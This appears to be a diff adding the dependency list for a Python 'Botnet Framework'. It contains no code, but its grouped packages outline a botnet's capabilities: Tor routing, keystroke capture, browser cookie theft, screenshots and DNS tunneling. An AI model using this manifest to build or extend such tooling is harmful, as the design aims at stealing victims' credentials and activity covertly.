@@ -1,0 +1,31 @@
+# Botnet Framework Requirements
+# Python 3.8+ required
+
+# Core Encryption & Security
+pycryptodome>=3.15.0
+cryptography>=3.4.0
+
+# Network & HTTP
+requests>=2.25.0
+stem>=1.8.0
+PySocks>=1.7.1
+
+# Web Dashboard
+flask>=2.0.0
+flask-socketio>=5.0.0
+
+# System Monitoring
+psutil>=5.8.0
+pynput>=1.7.6
+
+# Browser Data Access
+browser-cookie3>=0.15.0
+
+# Screenshot & Image Processing
+pillow>=8.0.0
+
+# DNS Tunneling (optional)
+dnslib>=0.9.0
+
+# Windows-specific (auto-install on Windows only)
+pywin32>=302; platform_system == "Windows"
